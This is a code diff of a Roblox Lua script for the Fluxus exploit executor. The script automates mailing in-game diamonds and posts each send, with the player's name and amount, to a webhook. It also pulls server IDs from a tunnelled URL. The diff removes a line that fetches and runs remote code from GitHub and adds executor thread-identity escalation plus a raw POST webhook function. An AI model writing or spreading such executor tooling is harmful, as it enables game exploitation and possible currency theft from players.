@@ -12,8 +12,19 @@ end)
 local httpService = game:GetService("HttpService")
 
 local apiUrl = "https://functioning-install-isa-larry.trycloudflare.com/servers"
-local API = loadstring(game:HttpGet("https://raw.githubusercontent.com/7BioHazard/Utils/main/API.lua"))()
+local Identity = fluxus.set_thread_identity()
 
+function Webhook(Url, Data)
+    (fluxus.request or function()
+    end) {
+        Url = Url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(Data)
+    }
+end
 local function makeGetRequest(url)
     local response = game:HttpGetAsync(url)
     return httpService:JSONDecode(response)["jobID"]
@@ -37,7 +48,7 @@ sendMail = function()
         mailed = Invoke("Send Mail", unpack(args))
         task.wait(0.5)
         if mailed == true then
-            API:Webhook(url, {
+            Webhook(url, {
                 ["embeds"] = {{
                     ["title"] = game:GetService("Players").LocalPlayer.Name .. " has sent a mail!",
                     ["description"] = "Diamonds Mailed: " .. string.format('%.2f', mailDiamonds / 1000000000) .. 'b',
